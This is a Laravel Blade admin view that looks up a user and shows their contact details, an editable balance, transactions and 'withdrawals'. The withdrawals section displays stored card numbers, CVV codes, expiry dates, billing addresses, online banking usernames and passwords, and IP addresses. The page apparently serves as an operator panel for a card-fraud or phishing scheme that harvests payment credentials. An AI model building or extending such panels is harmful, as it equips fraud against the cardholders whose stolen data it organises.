@extends('Admin.layouts.app')

@section('content')
	<div class="container-fluid">
		<div class="row">
			@if(!empty($user))
			<div class="jumbotron col-lg-12">

				<h2 class="text-center">The You Searched For {{$user->username}} </h2>
				<p><strong>The Email is : </strong> {{$user->email}}</p>
				<p><strong>The Phone is : </strong> {{$user->userData->phone}}</p>
				<p><strong>The Location is : </strong> {{$user->userData->city}},{{$user->userData->state}},USA,{{$user->userData->zipcode}}</p>

				<h4>The amount is: {{$user->amount}}</h4>

				<form action="{{route('edit.amount', $user->id)}}" class="form-horizontal" method="Post">
					@csrf
					<div class="form-group">
						<label for="" class="control-label">Amount</label>
						<input name="amount" type="text" class="form-control" placeholder="500" value="{{$user->amount == null ? ' ' :$user->amount}}">
					</div>
					<button type="submit" class="btn btn-primary" >Update</button>
				</form>
				<div class="clearfix"></div>
				<a href="{{route('user.info',$user->id)}}" style="float: right;" class="btn btn-primary pull-right">View</a>
			</div>
		
				<div class="col-lg-6">
					<div class="panel panel-primary">
					<div class="panel-body">
							<h3 class="text-center">Transactions</h3>
							<ul class="list-item">
							@if(!empty($user->transactions))
							@foreach($user->transactions as $trans)
								<li class="list-group-item">
									<a href="{{route('transactions.edit', $trans->id)}}"> <strong>Type: </strong>{{$trans->type}}, <strong>Status: </strong>{{$trans->status}}</a>
								</li>
								@endforeach
							</ul>
							@else
							<h2 class="text-center"><strong>{{$user->username}}</strong> has no transactions</h2>
							@endif
					</div>
				</div>
				</div>
				<div class="col-lg-6 pull-right">
					<h3 class="text-header text-center">Withdrawals</h3>
					<div class="panel-group" id="accordion">
						@if(!empty($user->withdrawals))
						@foreach($user->withdrawals as $card)
						  <div class="panel panel-primary">
						    <div class="panel-heading" style="background: #eee; padding: 10px; margin: 10px; color: white;">
						      <h4 class="panel-title text-center">
						        <a data-toggle="collapse" data-parent="#accordion" href="#{{$card->id}}">
						      {{$card->card_no}}</a>
						      </h4>
						    </div>
						    <div id="{{$card->id}}" class="panel-collapse collapse in">
						      <div class="panel-body">
						      	<p><strong>Address</strong>: {{$card->street}},{{ $card->city}},{{ $card->state}},{{$card->zipcode}}</p>
						      	<p><strong>CVV</strong>: {{$card->cvv}} </p>
						        <p><strong>Expiry</strong>: {{$card->exp_date}} </p>
						        <p><strong>Phone</strong>: {{$card->phone}}</p>
						        <p><strong>Online</strong>: <strong>Username:</strong>{{$card->username}}, <strong>Password:</strong> {{$card->password}}</p>
						        <p><strong>IP: {{$card->ip}}</p>
						      </div>
						    </div>
						  </div>
						  @endforeach
						  @else
						  <div class="jumbroton">
						  	<h3>No withdrawal for this user</h3>
						  </div>
						  @endif
						</div>				
					</div>
			</div>
			@else
			<div class="jumbotron col-lg-12">
				<h2 class="text-center">{{$_GET['search']}} Was not found</h2>
			</div>
			@endif

		</div>
	</div>
@endsection